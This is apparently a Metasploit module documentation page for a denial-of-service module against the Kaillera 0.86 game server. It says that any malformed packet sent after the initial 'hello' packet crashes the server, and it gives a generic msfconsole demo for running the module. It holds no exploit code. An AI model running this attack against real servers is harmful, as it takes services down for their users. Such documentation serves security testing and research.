## Kaillera 0.86 Server Denial of Service

The Kaillera 0.86 server can be shut down by sending any 
malformed packet after the intial "hello" packet.


## Module Name
auxiliary/dos/windows/games/kaillera

## Authors
* Sil3nt_Dre4m





## Platforms


## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use auxiliary/dos/windows/games/kaillera
msf auxiliary(kaillera) > show targets
   ... a list of targets ...
msf auxiliary(kaillera) > set TARGET <target-id>
msf auxiliary(kaillera) > show options
   ... show and set options ...
msf auxiliary(kaillera) > run
```
    
    